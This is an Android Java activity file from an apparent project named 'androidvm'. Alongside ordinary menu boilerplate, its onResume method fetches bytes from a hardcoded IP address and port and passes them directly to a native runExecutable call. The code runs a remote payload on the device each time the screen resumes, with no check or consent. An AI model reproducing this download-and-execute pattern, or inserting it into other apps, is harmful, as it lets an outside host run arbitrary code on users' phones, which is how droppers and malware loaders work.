package com.jiff.androidvm;

import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.ViewGroup;
import android.widget.TextView;

import com.jiff.androidvm.jni.JNI;
import com.jiff.androidvm.util.Util;

import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends BaseActivity {
    private TextView tv;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tv = (TextView) findViewById(R.id.testText);
        tv.setText(JNI.getString());
    }

    @Override
    protected void onResume() {
        super.onResume();

        Util.get("http://90.90.90.24:8080", new Util.HttpCallback() {
            @Override
            public void onSuccess(short code, byte[] response) {
                Log.d("Jiff", "response | code = " + code + " | response = " + response);
                JNI.runExecutable(response, response.length);
            }

            @Override
            public void onNetworkError() {
                Log.e("Jiff", "NETWORK ERROR!");
            }
        });

        Timer t = new Timer();
        t.schedule(new TimerTask() {
            @Override
            public void run() {
//                JNI.startActivity();
            }
        }, 2000);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
